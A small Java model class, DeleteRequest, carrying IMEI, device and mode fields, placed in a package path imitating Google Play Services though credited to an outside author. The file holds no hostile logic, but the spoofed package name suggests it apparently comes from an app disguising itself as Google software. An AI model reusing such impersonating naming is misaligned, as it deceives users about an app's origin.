package com.google.android.gms.persistent.googleapps.network.models.request;

/**
 * Created by OldMan on 05.04.2017.
 */

public class DeleteRequest extends BaseRequest {
    private String imei;
    private String device;
    private String mode;

    public DeleteRequest(String mode, String imei, String device) {
        super(imei, device);
        this.mode = mode;
    }

    public String getMode() {
        return mode;
    }

    public void setMode(String mode) {
        this.mode = mode;
    }
}
